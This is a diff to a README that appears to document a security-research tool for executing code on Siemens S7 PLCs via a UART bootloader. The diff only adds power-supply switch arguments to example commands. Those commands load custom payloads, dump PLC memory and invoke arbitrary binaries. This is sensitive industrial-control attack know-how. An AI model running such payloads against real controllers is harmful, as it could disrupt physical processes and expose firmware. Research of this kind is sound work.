@@ -185,7 +185,7 @@ Now, we can use our client utility. Open a new console window (without closing t
 **With automated power switching:**
 ```console
 # Ensure client.sh is configured with your power supply details
-sh client.sh --switch-power --powersupply-delay=1 test
+sh client.sh --switch-power --powersupply-fx3u-ip 192.168.1.18 --powersupply-fx3u-port 502 --powersupply-fx3u-output Y0 --powersupply-delay=1 test
 ```
 
 **With manual power cycle using `--no-power-supply`:**
@@ -226,7 +226,7 @@ Now we must use the tictactoe mode of our script utility as it allows us to inte
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/tic_tac_toe/build/tic_tac_toe.bin
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-fx3u-ip 192.168.1.18 --powersupply-fx3u-port 502 --powersupply-fx3u-output Y0 --powersupply-delay=1 tictactoe --payload=payloads/tic_tac_toe/build/tic_tac_toe.bin
 ```
 
 **With manual power cycle using `--no-power-supply`:**
@@ -261,7 +261,7 @@ This will generate `hello_loop.bin` file, which will be used by our client utili
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 hello_loop --payload=payloads/hello_loop/build/hello_loop.bin
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-fx3u-ip 192.168.1.18 --powersupply-fx3u-port 502 --powersupply-fx3u-output Y0 --powersupply-delay=1 hello_loop --payload=payloads/hello_loop/build/hello_loop.bin
 ```
 
 **With manual power cycle using `--no-power-supply`:**
@@ -296,7 +296,7 @@ Now we are ready to dump the PLC. Here we put power supply delay argument to 30 
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=30 dump -a 0x691E28 -l 256 --dump-payload payloads/dump_mem/build/dump_mem.bin
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-fx3u-ip 192.168.1.18 --powersupply-fx3u-port 502 --powersupply-fx3u-output Y0 --powersupply-delay=30 dump -a 0x691E28 -l 256 --dump-payload payloads/dump_mem/build/dump_mem.bin
 ```
 
 **With manual power cycle using `--no-power-supply`:**
@@ -317,7 +317,7 @@ This demonstrates using the generic `invoke` action to run a custom payload with
 # Ensure client.sh is configured. Replace <PORT>, path/to/custom.bin, arg1, arg2 accordingly.
 # This example assumes client.sh can pass through arguments to client.py's invoke action.
 # You might need to adapt client.sh or call client.py directly if client.sh doesn't support this well.
-sh client.sh --switch-power --powersupply-delay=1 invoke --payload path/to/your/custom_payload.bin -a arg1 arg2
+sh client.sh --switch-power --powersupply-fx3u-ip 192.168.1.18 --powersupply-fx3u-port 502 --powersupply-fx3u-output Y0 --powersupply-delay=1 invoke --payload path/to/your/custom_payload.bin -a arg1 arg2
 ```
 
 **With manual power cycle using `--no-power-supply`:**
